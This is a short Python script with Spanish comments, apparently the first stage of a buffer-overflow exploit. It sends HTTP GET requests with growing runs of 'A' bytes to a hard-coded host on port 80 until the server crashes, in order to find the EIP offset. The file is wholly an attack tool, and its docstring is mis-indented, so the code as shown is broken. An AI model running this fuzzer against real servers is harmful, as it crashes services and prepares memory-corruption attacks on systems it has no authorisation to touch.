from struct import pack
import socket, sys

# --- Variables ---

ip_address = "192.168.1.23" # < poner tu ip correspondiente
port = 80




# -- Funciones ---
def fuzzing():
"""
    Fuzzing para detectar el offset del EIP
"""

    longitud = 1000

    while True:
        try:
            buffer = b"A" * longitud    # \x41 es el valor en hexadecimal de "A"

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # para habilitar una conexion TCP
            s.connect((ip_address, port))
            
            s.send(b"GET /" + buffer + b" HTTP/1.1\r\n\r\n")
            s.close()
           
            longitud += 100
        except:
            print(f"Fuzzing crash con {longitud} bytes")
            sys.exit(1)




def exploit():
    fuzzing()




if __name__ == '__main__':
    exploit()
